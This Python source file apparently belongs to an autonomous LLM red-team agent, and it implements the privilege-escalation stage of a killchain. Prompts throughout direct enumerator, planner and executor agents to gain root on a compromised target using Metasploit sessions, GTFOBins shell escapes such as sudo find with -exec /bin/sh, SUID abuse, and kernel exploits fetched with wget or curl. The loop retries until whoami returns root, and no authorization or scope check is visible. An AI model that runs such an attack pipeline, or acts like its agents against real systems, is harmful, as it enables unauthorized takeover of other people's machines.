"""
PrivEsc Subgraph — Escalate privileges from user to root on a compromised target.

Fourth stage of the killchain: recon → initial_access → persistence → **privesc** → impact.
Produces structured PrivEscFindings for downstream consumption.

Architecture:
    Enumerator ⟷ SSH/MSF → Planner ⟷ RAG → Executor ⟷ SSH/MSF → Critic (3-way)
                                                                        ↓
                                                                 PASS → END
                                                                 FAIL_ENUM → Enumerator
                                                                 FAIL_TECHNIQUE → Planner
                                                                 FAIL_EXEC → Executor

Smart skip: if access_level == "root", returns immediately.

Usage:
    python stages/privesc.py                  # Interactive standalone mode
    python stages/privesc.py --graph          # Print graph topology
    from stages.privesc import run_privesc    # Programmatic subgraph call
"""

import sys
import json
import re
import time
import operator
from typing import TypedDict, Annotated, List, Literal

from langchain_core.messages import BaseMessage, HumanMessage, AIMessage, ToolMessage
from langchain_core.tools import tool
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langgraph.checkpoint.memory import MemorySaver

from core_agents.common import (
    Colors, print_colored, call_llm, parse_json_response,
    run_ssh_command, KALI_IP, MODEL_NAME, FORBIDDEN_COMMANDS,
)
from core_agents.state import PrivEscFindings
from tools.rag import query_knowledge_base
from tools.metasploit_tools import msf_session

# =============================================================================
# CONSTANTS
# =============================================================================

MAX_PRIVESC_RETRIES = 8
MAX_ENUM_TOOL_CALLS = 8
MAX_PLANNER_TOOL_CALLS = 5
MAX_EXECUTOR_TOOL_CALLS = 12

# =============================================================================
# STATE
# =============================================================================

class PrivEscState(TypedDict):
    messages: Annotated[List[BaseMessage], operator.add]
    target_ip: str
    session_id: str
    session_type: str           # "command_shell" | "meterpreter"
    access_level: str           # "user" | "root"
    os_info: str                # "Ubuntu 18.04" etc.
    objective: str
    enum_results: str           # Accumulated enumeration output
    escalation_plan: str        # Planner's chosen technique + steps
    escalation_result: str      # Executor's summary
    loop_step: int
    critic_verdict: str         # "PASS" | "FAIL_ENUM" | "FAIL_TECHNIQUE" | "FAIL_EXEC"

# =============================================================================
# TOOL DEFINITIONS
# =============================================================================

@tool
def tool_linux_terminal(command: str):
    """
    Execute a shell command on the Kali machine via SSH.
    Use this to run enumeration and escalation commands through the active session.
    NON-INTERACTIVE ONLY. No ftp, ssh, vi, nano, top.
    """
    if any(bad in command for bad in FORBIDDEN_COMMANDS):
        return "Command blocked by safety guardrails."
    print_colored(f"\n[PrivEsc Terminal] Executing: {command}", Colors.OKCYAN)
    return run_ssh_command(command)


@tool
def tool_metasploit_rpc(command: str):
    """
    Execute a command on the active Metasploit console.
    Use for interacting with sessions, running post modules, or local exploit suggesters.
    - 'sessions -i <id>' to interact with a session
    - 'run post/multi/recon/local_exploit_suggester' for automated suggestions
    - 'run post/linux/escalate/*' for escalation modules
    """
    try:
        return msf_session.send_command(command)
    except Exception as e:
        return f"RPC Error: {str(e)}"


# Tool sets
ENUM_TOOLS = [tool_linux_terminal, tool_metasploit_rpc]
PLANNER_TOOLS = [query_knowledge_base]
EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc]

# =============================================================================
# SYSTEM PROMPTS
# =============================================================================

ENUMERATOR_PROMPT = f"""You are a Privilege Escalation Enumerator for a Red Team agent. Your attacker IP is {KALI_IP}.

You have access to `tool_linux_terminal` (SSH to Kali) and `tool_metasploit_rpc` (MSF console).

**Your job:** Run enumeration commands on the target (through the active session) to discover privilege escalation vectors.

**Enumeration checklist — run these in order of priority:**

1. **Basic info**: `whoami`, `id`, `uname -a`, `cat /etc/os-release`
2. **Sudo check**: `sudo -l` (most common privesc vector)
3. **SUID binaries**: `find / -perm -4000 -type f 2>/dev/null`
4. **Writable paths**: `find / -writable -type d 2>/dev/null | head -20`
5. **Cron jobs**: `cat /etc/crontab`, `ls -la /etc/cron*`
6. **Running processes**: `ps aux | head -30`
7. **Kernel version**: `uname -r` (for kernel exploit matching)
8. **Capabilities**: `getcap -r / 2>/dev/null`
9. **LinPEAS** (if available): Download and run for comprehensive check

**How to execute commands through the session:**
- If session_type is "meterpreter": use `tool_metasploit_rpc` with 'sessions -i <id>', then 'shell', then commands
- If session_type is "command_shell": use `tool_metasploit_rpc` with 'sessions -i <id>', then run commands directly
- Alternative: use `tool_linux_terminal` to pipe commands through a reverse shell

**Rules:**
1. Execute commands ONE AT A TIME
2. READ outputs carefully — look for escalation vectors
3. Do NOT run more than {MAX_ENUM_TOOL_CALLS} commands
4. When done, provide a TEXT SUMMARY of all findings

**Output (final text — no more tool calls):**

ENUMERATION RESULTS:
- OS: <version>
- Kernel: <version>
- Current user: <username>
- Sudo rights: <what sudo -l returned>
- SUID binaries: <notable ones>
- Cron jobs: <any writable or interesting>
- Other vectors: <anything else found>
- RECOMMENDED VECTORS: <top 2-3 most promising escalation paths>
"""

PLANNER_PROMPT = f"""You are a Privilege Escalation Planner for a Red Team agent. Your attacker IP is {KALI_IP}.

You receive:
1. ENUMERATION RESULTS — output from the enumerator's scans
2. TARGET INFO — IP, OS, kernel, current access level
3. CRITIC FEEDBACK — if retrying, what went wrong

**You have access to `query_knowledge_base`** — search for specific escalation techniques.
Use verbose queries (e.g., "Linux privilege escalation via sudo misconfiguration NOPASSWD nmap GTFObins").
You may make up to {MAX_PLANNER_TOOL_CALLS} queries.

**Technique priority (based on enumeration results):**

1. **Sudo misconfig** — `sudo -l` shows NOPASSWD entries → check GTFOBins for that binary
2. **SUID abuse** — SUID binaries that allow shell escape (find, vim, python, nmap, etc.)
3. **Cron job abuse** — Writable cron scripts running as root
4. **Writable PATH** — PATH dirs writable + cron/service runs a command without full path
5. **Kernel exploit** — Match kernel version against known exploits (DirtyPipe, DirtyCow, etc.)
6. **Capabilities** — cap_setuid or other dangerous capabilities
7. **MSF post modules** — `post/multi/recon/local_exploit_suggester`, `post/linux/escalate/*`

**Output format (final answer — no more tool calls):**

ESCALATION PLAN:
TECHNIQUE: <method name>
VECTOR: <specific binary/cron/kernel version being exploited>
STEPS:
1. <exact command>
2. <exact command>
...
EXPECTED_RESULT: "whoami returns root" or "id shows uid=0"

**On retry:**
- Read critic feedback carefully
- Choose a DIFFERENT technique
- If FAIL_ENUM: you'll receive new enumeration data
- If FAIL_TECHNIQUE: the technique was wrong, pick another from the enum results
"""

EXECUTOR_PROMPT = f"""You are a Privilege Escalation Executor for a Red Team agent. Your attacker IP is {KALI_IP}.

You have access to `tool_linux_terminal` (SSH to Kali) and `tool_metasploit_rpc` (MSF console).

**Your job:** Execute the escalation plan step by step.

**Rules:**
1. Execute commands ONE AT A TIME
2. READ each output carefully
3. After the escalation attempt, ALWAYS verify with `whoami` and `id`
4. If `whoami` returns `root` or `id` shows `uid=0`, the escalation SUCCEEDED
5. Do NOT run more than {MAX_EXECUTOR_TOOL_CALLS} commands

**Common escalation execution patterns:**

Sudo abuse (GTFOBins):
- `sudo <binary>` with the specific escape sequence from GTFOBins
- e.g., `sudo find . -exec /bin/sh \\; -quit`
- e.g., `sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'`

SUID abuse:
- `./<suid_binary>` with the shell escape for that binary
- e.g., `find / -exec /bin/sh -p \\; -quit` (if find is SUID)

Kernel exploit:
- Download exploit to target (via wget/curl from Kali or compile on target)
- Compile if needed: `gcc exploit.c -o exploit`
- Run: `./exploit`
- Verify: `whoami`

MSF post modules:
- `sessions -i <id>` then `run post/linux/escalate/<module>`

**When done, provide a text summary:**
- Did `whoami` return `root`?
- What technique was used?
- Any errors encountered?
"""

CRITIC_PROMPT = f"""You are a Privilege Escalation Critic for a Red Team operation. Your IP is {KALI_IP}.

You evaluate whether privilege escalation succeeded.

**You receive:**
- Enumeration results
- Escalation plan (technique chosen)
- Execution result
- Loop step count

**Primary success criterion:** `whoami` returns `root` OR `id` shows `uid=0(root)`.

**3-way failure classification:**

- **PASS**: `whoami` confirmed root access. Done.
- **FAIL_ENUM**: The enumeration was insufficient — important vectors were missed.
  Use this when: no sudo -l was run, no SUID check, kernel version unknown.
  Action: route back to enumerator for more thorough scanning.
- **FAIL_TECHNIQUE**: The chosen technique was wrong for this target.
  Use this when: the technique was tried but the binary doesn't support shell escape,
  the kernel isn't vulnerable, sudo entry doesn't allow escalation.
  Action: route back to planner to choose a different technique.
- **FAIL_EXEC**: The technique is valid but execution had errors.
  Use this when: correct technique but typos in commands, wrong syntax,
  missing compilation step, wrong file path.
  Action: route back to executor to fix and retry.

**Output format:**

VERDICT: <PASS|FAIL_ENUM|FAIL_TECHNIQUE|FAIL_EXEC>

ASSESSMENT: <2-3 sentence summary>

FEEDBACK: <specific instructions for retry. Be precise:
           FAIL_ENUM → which enumeration commands to run
           FAIL_TECHNIQUE → which alternative technique to try
           FAIL_EXEC → what command to fix and how>
"""

# =============================================================================
# NODE IMPLEMENTATIONS
# =============================================================================

def enumerator_node(state: PrivEscState) -> dict:
    """Run privesc enumeration commands. ReAct loop with SSH/MSF."""
    messages = state["messages"]
    print_colored("\n[PrivEsc Enumerator] Scanning for escalation vectors...", Colors.HEADER)

    # Count enum tool calls
    enum_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" not in msg.content:
            break
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
            break
        if isinstance(msg, ToolMessage):
            enum_tool_count += 1

    if enum_tool_count == 0:
        context = (
            f"TARGET: {state.get('target_ip', '')}\n"
            f"OS: {state.get('os_info', 'unknown')}\n"
            f"SESSION: {state.get('session_type', '')} (ID: {state.get('session_id', '')})\n"
            f"CURRENT ACCESS: {state.get('access_level', 'user')}\n"
        )
        # Include critic feedback if retrying
        for msg in reversed(messages):
            if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
                context += f"\nCRITIC FEEDBACK:\n{msg.content}\n"
                break
        enum_msgs = [HumanMessage(content=context)]
    else:
        # Continuing ReAct — use recent messages
        enum_msgs = list(messages[-min(12, len(messages)):])

    if enum_tool_count >= MAX_ENUM_TOOL_CALLS:
        print_colored(f"[PrivEsc Enumerator] Tool cap ({enum_tool_count}).", Colors.WARNING)
        response = call_llm(
            messages=enum_msgs + [HumanMessage(content=(
                "Max enumeration commands reached. Summarize all findings now."
            ))],
            system_prompt=ENUMERATOR_PROMPT
        )
    else:
        response = call_llm(
            messages=enum_msgs,
            system_prompt=ENUMERATOR_PROMPT,
            tools=ENUM_TOOLS
        )

    if response.content and not response.tool_calls:
        return {
            "messages": [AIMessage(content=f"[PrivEsc Enumerator] {response.content}")],
            "enum_results": response.content,
        }

    return {"messages": [response]}


def planner_node(state: PrivEscState) -> dict:
    """Choose escalation technique based on enum results. ReAct with RAG."""
    messages = state["messages"]
    print_colored("\n[PrivEsc Planner] Selecting technique...", Colors.HEADER)

    planner_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and "[PrivEsc Enumerator]" in (msg.content or ""):
            break
        if isinstance(msg, ToolMessage):
            planner_tool_count += 1

    if planner_tool_count == 0:
        enum_results = state.get("enum_results", "")
        context = (
            f"ENUMERATION RESULTS:\n{enum_results}\n\n"
            f"TARGET: {state.get('target_ip', '')}\n"
            f"OS: {state.get('os_info', 'unknown')}\n"
            f"CURRENT ACCESS: {state.get('access_level', 'user')}\n"
        )
        for msg in reversed(messages):
            if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
                context += f"\nPREVIOUS FAILURE:\n{msg.content}\n"
                break
        planner_msgs = [HumanMessage(content=context)]
    else:
        # Continuing ReAct
        start = 0
        for i in range(len(messages) - 1, -1, -1):
            if isinstance(messages[i], AIMessage) and "[PrivEsc Enumerator]" in (messages[i].content or ""):
                start = i
                break
        planner_msgs = list(messages[start:])

    if planner_tool_count >= MAX_PLANNER_TOOL_CALLS:
        print_colored(f"[PrivEsc Planner] RAG cap reached.", Colors.WARNING)
        response = call_llm(
            messages=planner_msgs + [HumanMessage(content="Max queries reached. Produce your final escalation plan.")],
            system_prompt=PLANNER_PROMPT
        )
    else:
        response = call_llm(
            messages=planner_msgs,
            system_prompt=PLANNER_PROMPT,
            tools=PLANNER_TOOLS
        )

    if response.content and not response.tool_calls:
        print_colored(f"[PrivEsc Planner] Plan:\n{response.content[:300]}", Colors.OKGREEN)
        return {
            "messages": [AIMessage(content=f"[PrivEsc Planner] {response.content}")],
            "escalation_plan": response.content,
        }

    return {"messages": [response]}


def executor_node(state: PrivEscState) -> dict:
    """Execute escalation. ReAct loop with SSH/MSF."""
    messages = state["messages"]
    print_colored("\n[PrivEsc Executor] Running escalation...", Colors.HEADER)

    executor_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and "[PrivEsc Planner]" in (msg.content or ""):
            break
        if isinstance(msg, ToolMessage):
            executor_tool_count += 1

    executor_msgs = []
    capturing = False
    for msg in messages:
        if isinstance(msg, AIMessage) and "[PrivEsc Planner]" in (msg.content or ""):
            capturing = True
        if capturing:
            executor_msgs.append(msg)
    if not executor_msgs:
        executor_msgs = [messages[-1]]

    if executor_tool_count >= MAX_EXECUTOR_TOOL_CALLS:
        print_colored(f"[PrivEsc Executor] Tool cap ({executor_tool_count}).", Colors.WARNING)
        response = call_llm(
            messages=executor_msgs + [HumanMessage(content=(
                "Max tool calls reached. Report: did whoami return root? What happened?"
            ))],
            system_prompt=EXECUTOR_PROMPT
        )
    else:
        response = call_llm(
            messages=executor_msgs,
            system_prompt=EXECUTOR_PROMPT,
            tools=EXECUTOR_TOOLS
        )

    if response.content and not response.tool_calls:
        return {
            "messages": [response],
            "escalation_result": response.content,
        }

    return {"messages": [response]}


def critic_node(state: PrivEscState) -> dict:
    """3-way evaluation of privesc attempt."""
    current_step = state.get("loop_step", 0)
    print_colored("\n[PrivEsc Critic] Evaluating...", Colors.HEADER)

    evidence = (
        f"ENUMERATION RESULTS:\n{state.get('enum_results', '')[:2000]}\n\n"
        f"ESCALATION PLAN:\n{state.get('escalation_plan', '')}\n\n"
        f"EXECUTION RESULT:\n{state.get('escalation_result', '')}\n\n"
        f"LOOP STEP: {current_step} of {MAX_PRIVESC_RETRIES}\n"
    )

    response = call_llm(
        messages=[HumanMessage(content=evidence)],
        system_prompt=CRITIC_PROMPT
    )

    verdict_text = response.content.strip()
    print_colored(f"[PrivEsc Critic] {verdict_text[:300]}", Colors.OKCYAN)

    new_step = current_step + 1

    # Extract verdict
    upper = verdict_text.upper()
    if "VERDICT: PASS" in upper or ("PASS" in upper and "FAIL" not in upper):
        verdict = "PASS"
    elif "FAIL_ENUM" in upper:
        verdict = "FAIL_ENUM"
    elif "FAIL_TECHNIQUE" in upper:
        verdict = "FAIL_TECHNIQUE"
    elif "FAIL_EXEC" in upper:
        verdict = "FAIL_EXEC"
    else:
        verdict = "FAIL_TECHNIQUE"  # Safe default

    print_colored(f"[PrivEsc Critic] Verdict: {verdict}",
                  Colors.OKGREEN if verdict == "PASS" else Colors.FAIL)

    if verdict == "PASS":
        return {
            "messages": [AIMessage(content=f"[PrivEsc Critic] PASS — {verdict_text}")],
            "loop_step": new_step,
            "critic_verdict": "PASS",
        }
    else:
        return {
            "messages": [HumanMessage(content=f"CRITIC FEEDBACK: {verdict_text}")],
            "loop_step": new_step,
            "critic_verdict": verdict,
        }


# =============================================================================
# TOOL NODES
# =============================================================================

def enum_tools_node(state: PrivEscState) -> dict:
    tool_node = ToolNode(ENUM_TOOLS)
    return tool_node.invoke(state)

def planner_tools_node(state: PrivEscState) -> dict:
    tool_node = ToolNode(PLANNER_TOOLS)
    return tool_node.invoke(state)

def executor_tools_node(state: PrivEscState) -> dict:
    tool_node = ToolNode(EXECUTOR_TOOLS)
    return tool_node.invoke(state)

# =============================================================================
# ROUTING LOGIC
# =============================================================================

def route_after_enumerator(state: PrivEscState) -> Literal["enum_tools", "planner"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, HumanMessage):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_ENUM_TOOL_CALLS:
            return "planner"
        return "enum_tools"
    return "planner"


def route_after_planner(state: PrivEscState) -> Literal["planner_tools", "executor"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, AIMessage) and "[PrivEsc Enumerator]" in (m.content or ""):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_PLANNER_TOOL_CALLS:
            return "executor"
        return "planner_tools"
    return "executor"


def route_after_executor(state: PrivEscState) -> Literal["executor_tools", "critic"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, AIMessage) and "[PrivEsc Planner]" in (m.content or ""):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_EXECUTOR_TOOL_CALLS:
            return "critic"
        return "executor_tools"
    return "critic"


def route_after_critic(state: PrivEscState) -> Literal["enumerator", "planner", "executor", "__end__"]:
    time.sleep(2)
    current_step = state.get("loop_step", 0)
    if current_step >= MAX_PRIVESC_RETRIES:
        print_colored("--- MAX PRIVESC RETRIES REACHED ---", Colors.FAIL)
        return END
    verdict = state.get("critic_verdict", "FAIL_TECHNIQUE")
    if verdict == "PASS":
        return END
    elif verdict == "FAIL_ENUM":
        return "enumerator"
    elif verdict == "FAIL_TECHNIQUE":
        return "planner"
    elif verdict == "FAIL_EXEC":
        return "executor"
    else:
        return "planner"

# =============================================================================
# GRAPH CONSTRUCTION
# =============================================================================

def build_graph() -> StateGraph:
    workflow = StateGraph(PrivEscState)

    workflow.add_node("enumerator", enumerator_node)
    workflow.add_node("enum_tools", enum_tools_node)
    workflow.add_node("planner", planner_node)
    workflow.add_node("planner_tools", planner_tools_node)
    workflow.add_node("executor", executor_node)
    workflow.add_node("executor_tools", executor_tools_node)
    workflow.add_node("critic", critic_node)

    workflow.set_entry_point("enumerator")

    # Enumerator ReAct loop
    workflow.add_conditional_edges(
        "enumerator", route_after_enumerator,
        {"enum_tools": "enum_tools", "planner": "planner"}
    )
    workflow.add_edge("enum_tools", "enumerator")

    # Planner ReAct loop
    workflow.add_conditional_edges(
        "planner", route_after_planner,
        {"planner_tools": "planner_tools", "executor": "executor"}
    )
    workflow.add_edge("planner_tools", "planner")

    # Executor ReAct loop
    workflow.add_conditional_edges(
        "executor", route_after_executor,
        {"executor_tools": "executor_tools", "critic": "critic"}
    )
    workflow.add_edge("executor_tools", "executor")

    # Critic 3-way routing
    workflow.add_conditional_edges(
        "critic", route_after_critic,
        {
            "enumerator": "enumerator",
            "planner": "planner",
            "executor": "executor",
            END: END,
        }
    )

    return workflow

# =============================================================================
# FINDINGS EXTRACTION
# =============================================================================

def _extract_privesc_findings(state: dict) -> PrivEscFindings:
    critic_verdict = state.get("critic_verdict", "")
    escalation_plan = state.get("escalation_plan", "")
    escalation_result = state.get("escalation_result", "")
    access_level = state.get("access_level", "user")

    success = critic_verdict == "PASS"

    # Extract technique from plan
    technique = "unknown"
    plan_lower = escalation_plan.lower()
    if "sudo" in plan_lower:
        technique = "sudo_miscfg"
    elif "suid" in plan_lower:
        technique = "suid"
    elif "cron" in plan_lower:
        technique = "cron_abuse"
    elif "kernel" in plan_lower:
        technique = "kernel_exploit"
    elif "capabilit" in plan_lower:
        technique = "capabilities"
    elif "path" in plan_lower and "writable" in plan_lower:
        technique = "writable_path"

    previous_level = access_level
    new_level = "root" if success else access_level

    if success:
        summary = f"Escalated from {previous_level} to root via {technique}."
    else:
        summary = f"PrivEsc failed. Attempted: {technique}. {escalation_result[:100] if escalation_result else ''}"

    return PrivEscFindings(
        success=success,
        technique=technique,
        previous_level=previous_level,
        new_level=new_level,
        summary=summary,
    )

# =============================================================================
# ENTRY POINT
# =============================================================================

def run_privesc(
    target_ip: str,
    session_id: str,
    session_type: str,
    access_level: str,
    os_info: str = "",
    objective: str = "",
    thread_id: str = None,
    recursion_limit: int = 120,
) -> PrivEscFindings:
    import uuid

    # Smart skip: already root
    if access_level == "root":
        print_colored("[PrivEsc] Already root — skipping privilege escalation.", Colors.OKGREEN)
        return PrivEscFindings(
            success=True,
            technique="already_root",
            previous_level="root",
            new_level="root",
            summary="Already had root access. No escalation needed.",
        )

    if thread_id is None:
        thread_id = f"privesc_{uuid.uuid4().hex[:8]}"

    workflow = build_graph()
    checkpointer = MemorySaver()
    app = workflow.compile(checkpointer=checkpointer)

    config = {
        "configurable": {"thread_id": thread_id},
        "recursion_limit": recursion_limit,
    }

    initial_state = {
        "messages": [HumanMessage(content=(
            f"Escalate privileges on {target_ip}.\n"
            f"Session: {session_type} (ID: {session_id})\n"
            f"Current access: {access_level}\n"
            f"OS: {os_info}\n"
            f"Objective: {objective}"
        ))],
        "target_ip": target_ip,
        "session_id": session_id,
        "session_type": session_type,
        "access_level": access_level,
        "os_info": os_info,
        "objective": objective,
        "enum_results": "",
        "escalation_plan": "",
        "escalation_result": "",
        "loop_step": 0,
        "critic_verdict": "",
    }

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(f"[run_privesc] Starting privilege escalation subgraph", Colors.HEADER)
    print_colored(f"  Target: {target_ip}", Colors.HEADER)
    print_colored(f"  Session: {session_type} #{session_id}", Colors.HEADER)
    print_colored(f"  Current access: {access_level}", Colors.HEADER)
    print_colored(f"  OS: {os_info}", Colors.HEADER)
    print_colored(f"  Thread: {thread_id}", Colors.HEADER)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    for event in app.stream(initial_state, config=config):
        for key, value in event.items():
            if not value or "messages" not in value:
                continue
            msgs = value["messages"]
            if not isinstance(msgs, list):
                msgs = [msgs]
            for msg in msgs:
                if not isinstance(msg, BaseMessage) or not msg.content:
                    continue
                if "CRITIC FEEDBACK" in msg.content:
                    print_colored(f"\n{msg.content}", Colors.FAIL)
                elif isinstance(msg, ToolMessage):
                    display = msg.content[:500]
                    if len(msg.content) > 500:
                        display += "... [truncated]"
                    print(f"\n[Tool Output]: {display}")
                elif isinstance(msg, AIMessage):
                    content = msg.content
                    if "[PrivEsc Enumerator]" in content:
                        print_colored(f"\n{content[:400]}", Colors.HEADER)
                    elif "[PrivEsc Planner]" in content:
                        print_colored(f"\n{content[:400]}", Colors.OKBLUE)
                    elif "[PrivEsc Critic]" in content:
                        color = Colors.OKGREEN if "PASS" in content else Colors.FAIL
                        print_colored(f"\n{content[:400]}", color)
                    else:
                        print_colored(f"\nAgent: {content[:400]}", Colors.OKGREEN)

                if hasattr(msg, "tool_calls") and msg.tool_calls:
                    for t in msg.tool_calls:
                        print_colored(
                            f"   (Calling Tool: {t['name']} args: {str(t['args'])[:200]}...)",
                            Colors.OKCYAN
                        )

    final_snapshot = app.get_state(config)
    final_state = final_snapshot.values

    findings = _extract_privesc_findings(final_state)

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(
        f"[run_privesc] Complete — success={findings['success']}",
        Colors.OKGREEN if findings["success"] else Colors.FAIL
    )
    print_colored(f"  {findings['summary']}", Colors.OKCYAN)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    return findings

# =============================================================================
# STANDALONE MAIN
# =============================================================================

def main():
    if "--graph" in sys.argv:
        workflow = build_graph()
        app = workflow.compile()
        try:
            print(app.get_graph().draw_ascii())
        except Exception:
            graph = app.get_graph()
            print("Nodes:", [n for n in graph.nodes])
            print("Edges:", [(e.source, e.target) for e in graph.edges])
        return

    print_colored("--- PrivEsc Stage (Standalone) ---", Colors.OKGREEN)
    print_colored("Nodes: enumerator → planner → executor → critic (3-way routing)", Colors.OKCYAN)

    target_ip = input("\n[Target IP]: ").strip()
    session_id = input("[Session ID]: ").strip()
    session_type = input("[Session Type (command_shell/meterpreter)]: ").strip() or "command_shell"
    access_level = input("[Access Level (user/root)]: ").strip() or "user"
    os_info = input("[OS Info (optional)]: ").strip()

    findings = run_privesc(
        target_ip=target_ip,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
        os_info=os_info,
    )

    print("\n" + json.dumps(dict(findings), indent=2, default=str))


if __name__ == "__main__":
    main()